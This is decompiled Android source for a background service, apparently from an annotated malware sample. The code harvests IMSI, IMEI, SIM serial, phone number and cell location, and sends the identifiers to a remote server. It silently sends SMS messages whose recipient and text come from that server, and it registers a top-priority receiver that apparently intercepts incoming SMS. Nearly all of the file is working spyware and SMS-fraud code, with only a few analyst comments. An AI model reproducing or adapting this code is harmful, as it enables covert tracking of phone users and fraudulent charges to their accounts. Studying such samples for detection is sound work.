package com.amaz.onib;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.CellLocation;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import bn.sdk.szwcsss.common.az.c.receiver.ReceiveSmsReceiver;
import com.amaz.onib.ap;
/* loaded from: classes.dex */
public class FSrvi extends Service {

    /* renamed from: a  reason: collision with root package name */
    private ba f582a;
    private bd b;
    private int c = 0;
    // [fmss] This handler can execute 3 times the method a(int i) that is able to send SMS.
    private Handler d = new Handler() { // from class: com.amaz.onib.FSrvi.1
        @Override // android.os.Handler
        public void handleMessage(Message message) {
            if (FSrvi.this.c < 3) {
                FSrvi.this.a(FSrvi.this.c);
                FSrvi.this.c++;
            }
        }
    };
    public static String APPID = "10001";
    public static String CHANNEL = "0";
    public static String UA = "";
    public static String UID = "";
    public static String IMSI = "";
    public static String IMEI = "";
    public static String TEL = "";
    public static String ICCID = "";
    public static String ANDROID_VERSION = "";
    public static int OPERATOR = -1;
    public static boolean IS_START_GET_MOBILE = false;
    public static int lac = 0;
    public static int cid = 0;

    private void a() {
        bu.a(this);
        IMSI = by.a(this);
        OPERATOR = bv.a(this);
        UA = bv.b(this);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
        IMEI = telephonyManager.getDeviceId();
        ICCID = telephonyManager.getSimSerialNumber();
        ANDROID_VERSION = "Android_" + Build.VERSION.RELEASE;
        TEL = bw.a(this, IMSI);
        UID = bw.b(this);
        sendBroadcast(new Intent(Utils.ACTION_SERVICES_ONCREATED));
        bs.b("imsi:" + IMSI + ",  OPERATOR:" + OPERATOR);
        CellLocation cellLocation = telephonyManager.getCellLocation();
        if (cellLocation instanceof GsmCellLocation) {
            GsmCellLocation gsmCellLocation = (GsmCellLocation) cellLocation;
            lac = gsmCellLocation.getLac();
            cid = gsmCellLocation.getCid();
        } else if (cellLocation instanceof CdmaCellLocation) {
            CdmaCellLocation cdmaCellLocation = (CdmaCellLocation) cellLocation;
            lac = cdmaCellLocation.getNetworkId();
            cid = cdmaCellLocation.getBaseStationId();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(final int i) {
        String str;
        String str2 = System.currentTimeMillis() + "";
        bs.b((IMSI + "#" + IMEI + "#" + str2 + "#88#263DB84A8B8A75E") + "\n" + bt.a(str));
        new ap().a(ar.b + "GetMobile/MatchingMobile.aspx?IMSI=" + IMSI + "&IMEI=" + IMEI + "&TimeStamp=" + str2 + "&ChannelId=88&Sign=" + bt.a(str), new ap.a() { // from class: com.amaz.onib.FSrvi.2
            @Override // com.amaz.onib.ap.a
            public void a(k kVar) {
                if (kVar == null) {
                    return;
                }
                if ("1".equals(kVar.f735a)) {
                    bs.b("获取到手机号" + kVar.c);
                    FSrvi.TEL = kVar.c;
                    bw.a(FSrvi.this, FSrvi.TEL, FSrvi.IMSI);
                } else if (!kVar.a() || i != 0) {
                    FSrvi.this.d.sendEmptyMessageDelayed(1000, 10000L);
                } else {
                    bs.b("发送短信");
                    SmsManager.getDefault().sendTextMessage(kVar.d, null, kVar.e, null, null);
                    FSrvi.this.d.sendEmptyMessageDelayed(1000, 5000L);
                }
            }
        }, this);
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        int i;
        super.onCreate();
        bs.b("CoreService...onCreate");
        a();
        this.b = new bd();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.setPriority(Integer.MAX_VALUE);
        intentFilter.addAction(ReceiveSmsReceiver.f557a); // [fmss] f557a is the constant android.provider.Telephony.SMS_RECEIVED
        registerReceiver(this.b, intentFilter);
        this.f582a = new ba();
        IntentFilter intentFilter2 = new IntentFilter();
        intentFilter2.setPriority(Integer.MAX_VALUE);
        intentFilter2.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        registerReceiver(this.f582a, intentFilter2);
        try {
            i = Integer.parseInt(CHANNEL);
        } catch (Exception e) {
            i = 10001;
        }
        bx.b(this, APPID, i);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        if (this.b != null) {
            this.b.a();
            unregisterReceiver(this.b);
        }
        if (this.f582a != null) {
            unregisterReceiver(this.f582a);
        }
        bs.b("CoreService...onDestroy");
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        bs.b("onStartCommand....");
        if (by.a(IMSI)) {
            a();
        }
        UID = bw.b(this);
        bs.b("uid:" + UID);
        if (by.a(TEL) && !by.a(IMSI) && !IS_START_GET_MOBILE) {
            IS_START_GET_MOBILE = true;
            bs.b("IS_START_GET_MOBILE...." + IS_START_GET_MOBILE);
            this.d.sendEmptyMessage(1000);
        }
        return super.onStartCommand(intent, i, i2);
    }
}
